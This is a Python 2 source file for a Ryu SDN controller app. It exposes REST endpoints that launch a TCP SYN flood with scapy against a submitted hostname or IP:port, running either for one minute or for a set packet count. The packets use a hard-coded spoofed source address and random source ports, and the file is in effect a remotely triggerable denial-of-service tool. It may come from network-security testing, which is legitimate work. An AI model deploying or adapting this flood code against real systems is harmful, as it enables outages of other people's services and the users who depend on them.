import json

from ryu.app import simple_switch_13
from webob import Response
from ryu.controller import ofp_event
from ryu.controller.handler import CONFIG_DISPATCHER
from ryu.controller.handler import set_ev_cls
from ryu.app.wsgi import ControllerBase, WSGIApplication, route
import socket
import time

from route import urls
from helper import file_helper
from scapy.all import *
import random

packet_sender_instance_name = 'packet_sender_api_app'
conf.iface = 'eth0'


class sendSYN():

    def __init__(self, target, port):
        self.target = target
        self.port = port

    def run(self):
        i = IP()
        i.src = '192.168.11.23'
        i.dst = self.target
        t = TCP()
        t.sport = random.randint(1, 65535)
        t.dport = self.port
        t.flags = 'S'
        send(i/t, verbose=0)


class PacketSender(simple_switch_13.SimpleSwitch13):

    _CONTEXTS = {'wsgi': WSGIApplication}

    def __init__(self, *args, **kwargs):
        super(PacketSender, self).__init__(*args, **kwargs)
        self.switches = {}
        wsgi = kwargs['wsgi']
        wsgi.register(PacketSenderController,
                      {packet_sender_instance_name: self})

    @set_ev_cls(ofp_event.EventOFPSwitchFeatures, CONFIG_DISPATCHER)
    def switch_features_handler(self, ev):
        super(PacketSender, self).switch_features_handler(ev)
        datapath = ev.msg.datapath
        self.switches[datapath.id] = datapath
        self.mac_to_port.setdefault(datapath.id, {})

    def store_file(self, info, filename):
        path = '../config/' + filename
        with open(path, 'w') as f:
            f.write(json.dumps(info))
        f.close()

    # Hostname
    def send_time_hostname(self):
        total = 0
        with open('../config/target.json', 'r') as f:
            json_data = json.load(f)
            Hostname = json_data['target']
            ip = socket.gethostbyname(Hostname)
            port = 80
            runtime = time.time() + 60

        while 1:
            if time.time() < runtime:
                sendSYN(ip, port).run()
                total += 1
                print total
            else:
                print "Send one minute."
                break

    def send_count_hostname(self):
        total = 0
        with open('../config/target.json', 'r') as f:
            json_data = json.load(f)
            Hostname = json_data['target']
            ip = socket.gethostbyname(Hostname)
            port = 80
            count = json_data['count']

        while 1:
            if total < count:
                sendSYN(ip, port).run()
                total += 1
                print total
            else:
                print "Send " + str(total) + " packet"
                break

    # IP address
    def send_time_ip(self):
        total = 0
        json_data = file_helper.read_file('target.json')

        ipaddr = json_data['target']
        ip = ipaddr.split(':')[0]
        port = int(ipaddr.split(':')[1])
        runtime = time.time() + 60

        while 1:
            if time.time() < runtime:
                sendSYN(ip, port).run()
                total += 1
                print total
            else:
                print "Send one minute."
                break

    def send_count_ip(self):
        total = 0

        json_data = file_helper.read_file('target.json')
        ipaddr = json_data['target']
        ip = ipaddr.split(':')[0]
        port = int(ipaddr.split(':')[1])
        count = json_data['count']

        while 1:
            if total < count:
                sendSYN(ip, port).run()
                total += 1
                print total
            else:
                print "Send " + str(total) + " packet"
                break


class PacketSenderController(ControllerBase):

    def __init__(self, req, link, data, **config):
        super(PacketSenderController, self).__init__(req, link, data, **config)
        self.packet_sender_spp = data[packet_sender_instance_name]

    # hostname
    @route('packet_sender', urls.hostname_time, methods=['POST'])
    def hn_sendpacket_bytime(self, req, **kwargs):

        packet_sender = self.packet_sender_spp
        Info = json.loads(req.body)

        try:
            file_helper.store_file(Info, 'target.json')
            packet_sender.send_time_hostname()

        except:
            return Response(status=500)

    @route('packet_sender', urls.hostname_count, methods=['POST'])
    def hn_sendpacket_bycount(self, req, **kwargs):

        packet_sender = self.packet_sender_spp
        Info = json.loads(req.body)

        try:
            file_helper.store_file(Info, 'target.json')
            packet_sender.send_count_hostname()

        except:
            return Response(status=500)

    # IP address
    @route('packet_sender', urls.ip_time, methods=['POST'])
    def ip_sendpacket_bytime(self, req, **kwargs):

        packet_sender = self.packet_sender_spp
        Info = json.loads(req.body)

        try:
            file_helper.store_file(Info, 'target.json')
            packet_sender.send_time_ip()

        except:
            return Response(status=500)

    @route('packet_sender', urls.ip_count, methods=['POST'])
    def ip_sendpacket_bycount(self, req, **kwargs):

        packet_sender = self.packet_sender_spp
        Info = json.loads(req.body)

        try:
            file_helper.store_file(Info, 'target.json')
            packet_sender.send_count_ip()

        except:
            return Response(status=500)
